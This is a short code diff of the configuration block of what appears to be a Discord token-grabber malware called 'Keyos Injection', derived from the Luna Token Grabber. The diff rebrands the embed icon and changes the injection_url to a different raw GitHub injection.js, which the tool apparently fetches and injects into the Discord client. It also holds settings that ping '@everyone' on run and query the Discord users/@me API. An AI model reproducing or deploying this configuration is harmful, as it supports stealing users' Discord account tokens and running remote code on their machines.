@@ -12,9 +12,9 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone', 
   embed_name: 'Keyos Injection', 
-  embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'.replace(/ /g, '%20'),
+  embed_icon: 'https://cdn.discordapp.com/attachments/1340210965375094854/1340243853550161940/softshit_logo_grey.png?ex=68113b9b&is=680fea1b&hm=ffcdac3afc6bb064b814fb29b227a138290669db3086bac456b60e73726831a9&'.replace(/ /g, '%20'),
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/keyosbuff/Grabber-Injection/refs/heads/main/injection.js', 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
